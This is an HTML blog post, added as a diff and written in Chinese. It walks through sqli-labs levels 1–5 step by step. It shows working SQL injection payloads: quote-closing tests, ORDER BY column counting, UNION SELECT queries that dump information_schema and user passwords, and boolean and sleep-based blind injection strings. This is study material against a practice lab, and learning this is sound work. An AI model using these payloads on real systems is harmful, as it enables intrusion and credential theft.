@@ -1,0 +1,708 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="H0ne">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="前言说出来满满都是泪呀 &#x2F;(ㄒoㄒ)&#x2F;~~我的靶场一直搭建不好，tmd，PHP study下载好了，并且在db-creds.inc里的用户地址也改为了本地127.0.0.1（localhost) 但是在打开靶场，发现打不开题（知道有多难受么）知道最近才问学长，同学，才发现是自己的PHP study版本太高了，这里就又出现一个问题，哎，我下载了好几个版本，但是他还是一直用的是原先">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SqlLabs">
+<meta property="og:url" content="http://example.com/2023/04/20/SqlLabs/index.html">
+<meta property="og:site_name" content="H0ne&#39;s Blog">
+<meta property="og:description" content="前言说出来满满都是泪呀 &#x2F;(ㄒoㄒ)&#x2F;~~我的靶场一直搭建不好，tmd，PHP study下载好了，并且在db-creds.inc里的用户地址也改为了本地127.0.0.1（localhost) 但是在打开靶场，发现打不开题（知道有多难受么）知道最近才问学长，同学，才发现是自己的PHP study版本太高了，这里就又出现一个问题，哎，我下载了好几个版本，但是他还是一直用的是原先">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210313125859474.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMTQyMzY4,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210313130410866.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMTQyMzY4,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210313132304994.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMTQyMzY4,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210313132446411.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMTQyMzY4,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210313132532823.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210313133609882.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210313134452327.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMTQyMzY4,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210313134528426.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMTQyMzY4,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210313134948524.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMTQyMzY4,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210313135126413.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMTQyMzY4,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/2021031313514524.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMTQyMzY4,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210313135222380.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMTQyMzY4,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210313135226694.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMTQyMzY4,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210313135833300.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210313140411392.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210313140617814.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210313140905176.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMTQyMzY4,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210313140916338.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMTQyMzY4,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210313141013834.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMTQyMzY4,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/2021031314140237.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210313141552705.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210313141725415.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210313142837428.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210313143111501.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMTQyMzY4,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210313143222242.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210313143703650.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210404175712507.gif">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210406191701566.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMTQyMzY4,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210407115520538.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMTQyMzY4,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210407125517624.gif">
+<meta property="article:published_time" content="2023-04-20T15:33:27.660Z">
+<meta property="article:modified_time" content="2023-04-20T15:12:50.074Z">
+<meta property="article:author" content="H0ne">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://img-blog.csdnimg.cn/20210313125859474.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMTQyMzY4,size_16,color_FFFFFF,t_70">
+  
+  
+  
+  <title>SqlLabs - H0ne&#39;s Blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+  
+<link rel="stylesheet" href="/css/fluid-extension.css">
+<link rel="stylesheet" href="//cdn.jsdelivr.net/gh/EmoryHuang/BlogBeautify@1.1/shubiao.css">
+<link rel="stylesheet" href="//cdn.jsdelivr.net/gh/EmoryHuang/BlogBeautify@1.1/scroll.css">
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.4","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>H0ne&#39;s Blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="SqlLabs"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-04-20 23:33" pubdate>
+          2023年4月20日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          5.1k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          43 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">SqlLabs</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>说出来满满都是泪呀 &#x2F;(ㄒoㄒ)&#x2F;~~<br>我的靶场一直搭建不好，tmd，PHP study下载好了，并且在db-creds.inc里的用户地址也改为了本地127.0.0.1（localhost) 但是在打开靶场，发现打不开题（知道有多难受么）知道最近才问学长，同学，才发现是自己的PHP study版本太高了，这里就又出现一个问题，哎，我下载了好几个版本，但是他还是一直用的是原先呢个高版本，我裂开，这一个问题又愁了好几天，服了，直到有一天，偶然翻PHPstudy时找到了一个神奇的地方<br><img src="https://img-blog.csdnimg.cn/20210313125859474.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMTQyMzY4,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br>然后神奇的靶场就能打开了</p>
+<h2 id="第一关"><a href="#第一关" class="headerlink" title="第一关"></a>第一关</h2><p>首先先判断闭合符号 闭合符号有四种 ‘ “ ’） ”）（就是这闭合符号的判断是最要人命的，为啥有的时候就报错，有的时候就不报错，然后辛辛苦苦查资料，看视频，一直处于模棱两可的状态，知道今天终于让我明白了，哈哈，真的，真正掌握之后，你会很轻松，并且开心的一匹） 咱们从原码跟做题一块分析，这样让咱们好理解<br><img src="https://img-blog.csdnimg.cn/20210313130410866.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMTQyMzY4,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br>这一句话就是他的原码，注意，这里补充一下，最好用火狐浏览器，里面有hackbar插件，老版火狐最好，因为新版火狐的hackbar插件他不编译+，编译出来就是%27 （懂得都懂）<br>先输入一个引号，发现报错，报错就对了，要的就是报错！</p>
+<p><img src="https://img-blog.csdnimg.cn/20210313132304994.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMTQyMzY4,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br>然后输入–+（注释符号），发现就又成功了<br><img src="https://img-blog.csdnimg.cn/20210313132446411.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMTQyMzY4,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br>这得通过源码来解释<br><img src="https://img-blog.csdnimg.cn/20210313132532823.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br>你输入的一个 ‘ 正好是id 后面的引号，源码就变成了 <strong>’$id’ ‘</strong>  因为多了一个 ‘ 所以就会报错，但是当你在后面再输入–+时 源码就变成了 <img src="https://img-blog.csdnimg.cn/20210313133609882.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br>你输入的引号与前面的引号闭合，而–+ 注释掉了后面的 ‘  就不会再报错<br>而 LIMIT 0,1 这里面的0 就是你前面需要的id里的第一位，如果是LIMIT 1,1 就是id里的第二位 而LIMIT 0,1 后面的1就是显示1个id，如果是LIMIT 0,2<br>呢么就是id里的第一个开始排序，排出前两位输出（这里就不展示了，想试试的下去可是试试）<br>然后就要判断他的列数 order by （order by 4 将列表里的第四列从上到下按二十六个字母顺序排序，如果没有第四列，就会报错，这就是order by 能判断列数的原因）</p>
+<p><img src="https://img-blog.csdnimg.cn/20210313134452327.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMTQyMzY4,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br>看！ 这里就出现报错了 说明他没有第四列<br><img src="https://img-blog.csdnimg.cn/20210313134528426.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMTQyMzY4,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br>这里就说明这个字段有三列<br><strong>然后就开始联合查询注入</strong><br><strong>先爆出他所有的数据库</strong><br>因为他有三列<br>所以后面的1,2,3  两个逗号分开了三个数字,三个数字就表示有三列(如果是四列的话 就要三个逗号分开四个数字了,逗号里的数字可以随便写)<br>查询它所有的数据库(如果联合查询语句不理解的话,去看看我上面的博客,这里直接开始操作)（用union select语句之前要让id等于一个不存在的值，不然他就只执行id的命令，所以当你的id报错时，后面的联合查询才有效)<br>group_cancat函数是激将所有的内容列出来<br><img src="https://img-blog.csdnimg.cn/20210313134948524.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMTQyMzY4,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br>查询库 (select group_concat(schema_name) from information_schema.schemata<br><strong>接下来就是查询security库里面的所有的表</strong></p>
+<p><img src="https://img-blog.csdnimg.cn/20210313135126413.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMTQyMzY4,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br>Select group_concat(table_name) from information_schema.tables where table_schema&#x3D;’security’ (这里的单引号可能出现编译错误的问题,所以这里可以使用十六进制 变成0xsecurity的十六进制形式)我还没遇到过这种情况,到时候遇见再说<br><strong>接下来就是查询users的列</strong></p>
+<p><img src="https://img-blog.csdnimg.cn/2021031313514524.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMTQyMzY4,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br>Select group_concat(column_name) from information schema.columns where table_name&#x3D;’users’<br><strong>我么最终是要爆出他的username和password</strong><br><img src="https://img-blog.csdnimg.cn/20210313135222380.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMTQyMzY4,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210313135226694.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMTQyMzY4,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br>Select group_concat(usersname) from security.users<br>Selecy group concat(password) from security.users</p>
+<p>**后面我就只就讲如何查询字符了，因为后面几关就只有判断字符，数值不一样，剩下的都一样</p>
+<h2 id="第二关"><a href="#第二关" class="headerlink" title="第二关"></a>第二关</h2><p>先看源代码<br><img src="https://img-blog.csdnimg.cn/20210313135833300.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br>发现没有 这里的$id 左右没有任何字符，说明他就是另一种注入方式了，<strong>数值型注入</strong><br>做题的话咋判断他是字符型注入还是数值型注入呢 看<br><img src="https://img-blog.csdnimg.cn/20210313140411392.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210313140617814.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<p>注意LIMIT前面的符号，这里我第一个输入的id&#x3D;1”  第二个我输入的是 id&#x3D;1’  有没有发现啥，我自己输入的东西报错了<br>说明就是数值型注入<br>还有一种方法就是 输入 id&#x3D;1 and 1&#x3D;1 没报错 输入 id&#x3D;1 and 1&#x3D;2报错的话 就是数值型植入，看你们自己的习惯吧<br><img src="https://img-blog.csdnimg.cn/20210313140905176.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMTQyMzY4,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210313140916338.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMTQyMzY4,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<h2 id="第三关"><a href="#第三关" class="headerlink" title="第三关"></a>第三关<img src="https://img-blog.csdnimg.cn/20210313141013834.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMTQyMzY4,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></h2><p>输入一个‘ 发现报错了<br><img src="https://img-blog.csdnimg.cn/2021031314140237.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述">注意报错的信息 后面多了一个）看源码<br><img src="https://img-blog.csdnimg.cn/20210313141552705.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br>咱们输入 ‘ 后 源码就变成了<br><img src="https://img-blog.csdnimg.cn/20210313141725415.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br>咱们刚才输入了一个’ 源码后面就变成了双引号 与最前面的双引号对照了，所以就会编译出错误的） 所以咱么就再输入一个） 让源码变成<br><img src="https://img-blog.csdnimg.cn/20210313142837428.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br>让（‘’）构成闭合而–+注释掉后面的‘） 就不会再报错</p>
+<h2 id="第四关"><a href="#第四关" class="headerlink" title="第四关"></a>第四关</h2><p><img src="https://img-blog.csdnimg.cn/20210313143111501.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMTQyMzY4,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br>输入一个 ‘  发现没报错，说明没构成闭合，所以说明 ‘ 是错的，然后试试 “<br><img src="https://img-blog.csdnimg.cn/20210313143222242.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br>发现出现报错 咱们输入的 “ 与最前面的 “ 构成了闭合 所以会出现后面的报错信息，还是放源码，这样咱们好理解<br><img src="https://img-blog.csdnimg.cn/20210313143703650.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述">、</p>
+<p>发现了点啥没，同志们<br>咱们后面的 因为 “) 编译错误了，所以他的闭合符号必是”（“ “),<br>哎，写了一下午，终于写完了，笔者如果哪里写的不对或者思路有问题，欢迎各位师傅指教 🤭</p>
+<p>继续写</p>
+<p>清明节放三天假,哎!都去玩了,都去玩了,留下孤独的我与阿尉在学校周围乱转,不过,正好在这个时间把之前学习过的没整理的学习产出整理下来,再学习一点新的东西!<br><img src="https://img-blog.csdnimg.cn/20210404175712507.gif" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<h4 id="补充："><a href="#补充：" class="headerlink" title="补充："></a>补充：</h4><p>咱们先补充一些知识点,布尔盲驻,注入的语句返回只会返回1和0,1就是对的,而0就是错的!</p>
+<p><font color=blue >left()函数</font>: left(database(),1)&#x3D;’s’   left(a,b)从截取a的前b位,正确则返回1,错误则返回0<br><font color=blue >regexp函数</font>: select user() regexp ‘r’    user()的结果是root,regexp为匹配root的正则表达式<br><font color=blue >like函数</font>:select user() like ‘ro%’   匹配与regexp相似<br><font color=blue >sbustr(a,b,c)    </font>    select substr() xx   xx  substr(a,b,c)从位置b开始,截取a字符串c位长度<br><font color=blue >ascii()</font>    将某个字符串转化为ascii的值</p>
+<p><font color=blue >chr(‘数字’)  或者是ord(‘字母’) </font> 使用<code>python</code>中的两个函数可以判断当前的ascii值是多少<br>对于security数据库:<br>注入时  <font color=blue >注意加and</font></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php/">left((select database()),1)=&#x27;s&#x27;--+         前1位是否是s <br>(select database()） regexp &#x27;s&#x27;;       匹配第一个字符是否是s<br>(select database()) like &#x27;s%&#x27;;     匹配第一个字符是否是s<br>(select substr((select database()),1,1))=&#x27;s&#x27;; 匹配第一个字符是否是s<br>(select substr ((select database()),1,3))=&#x27;sec&#x27;;  匹配前三个字符是否是sec<br>(select ascii(substr((select database()),1,1)));  直接回显115  或者是  s<br>(select ascii(substr((select database()),1,1)))&gt;110;  如果大于110,就会返回1,<br></code></pre></td></tr></table></figure>
+<p>否则返回0<br><font color=blue >sleep函数 </font><br>  时间延迟型手工注入，<font color=red>正确会延迟，错误没有延迟。</font><br /> 可以通过浏览器的刷新提示观察延迟情况，但是id正确的时候的回显有利于观察。<br>构造sql语句，带上时间延迟的函数，如果有明显的延迟说明有注入点。</p>
+<h4 id="第五关"><a href="#第五关" class="headerlink" title="第五关:"></a>第五关:</h4><p>闭合符号的判断都没啥说的了，然后直接order by 判断列数，      <font color=red>咱们直接上干货！</font><br /></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php\">?id=1’ and if(length(database())=8,sleep(5),1)--+<br></code></pre></td></tr></table></figure>
+<p>当你的数据库长度为8时，输出就会延迟5秒钟，如果不是8，则不会延迟<br><img src="https://img-blog.csdnimg.cn/20210406191701566.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMTQyMzY4,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br>说明数据库的长度是8，然后<font color=red>下一步就是爆出数据库</font><br /> </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php\">?id=1&#x27; and left((select database()),1)=&#x27;s&#x27;--+ <br>?id=1&#x27; and left((select database()),2)=&#x27;se&#x27;--+ <br>.<br>.<br>.<br>?id=1&#x27; and left((select database()),8)=&#x27;security&#x27;--+ <br></code></pre></td></tr></table></figure>
+<p>然后下一步就是<font color=red>猜表名</font><br /> </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php\">?id=1&#x27; and left((select table_name from information_schema.tables where table_schema=database() limit 3,1),5)=&#x27;users&#x27;--+<br></code></pre></td></tr></table></figure>
+<p>然后就是<font color=red>判断列名</font><br /> </p>
